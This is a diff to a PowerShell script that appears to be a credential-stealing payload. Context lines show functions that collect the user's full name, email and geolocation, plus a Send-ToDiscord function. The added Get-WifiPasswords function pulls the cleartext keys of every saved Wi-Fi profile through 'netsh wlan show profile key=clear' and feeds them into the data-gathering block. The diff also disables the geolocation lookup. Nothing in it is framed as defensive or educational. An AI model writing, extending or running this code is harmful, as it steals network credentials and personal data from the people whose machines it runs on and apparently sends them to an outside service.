@@ -67,13 +67,37 @@ $EM = Get-email
 
 # Get nearby wifi networks
 
-try
-{
-$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
-}
-catch
-{
-$NearbyWifi="No nearby wifi networks detected"
+function Get-WifiPasswords {
+    try {
+        # Get Wi-Fi profiles using netsh
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+            $_ -match ':\s*(.+)$' | Out-Null
+            $profile = $matches[1].Trim()
+
+            # Use a timeout for retrieving passwords
+            $keyContent = ""
+            $startTime = Get-Date
+            while ($keyContent -eq "" -and ((Get-Date) - $startTime).TotalSeconds -lt 5) {
+                try {
+                    $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
+                } catch {
+                    Write-Error "Failed to retrieve Wi-Fi password for $profile"
+                    break
+                }
+            }
+
+            # Return the profile name and password if found
+            if ($keyContent) {
+                "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')"
+            } else {
+                "$profile: No password found or access denied"
+            }
+        }
+
+        return $profiles -join "`n"
+    } catch {
+        return "No Wi-Fi profiles found or access denied."
+    }
 }
 
 ############################################################################################################################################################
@@ -349,7 +373,7 @@ function Send-ToDiscord {
 # Main Script: Gather Information
 $FullName = Get-FullName
 $Email = Get-Email
-$GeoLocation = Get-GeoLocation
+#$GeoLocation = Get-GeoLocation
 $WiFiPasswords = Get-WifiPasswords
 $HostName = $env:COMPUTERNAME
 $SystemInfo = @"
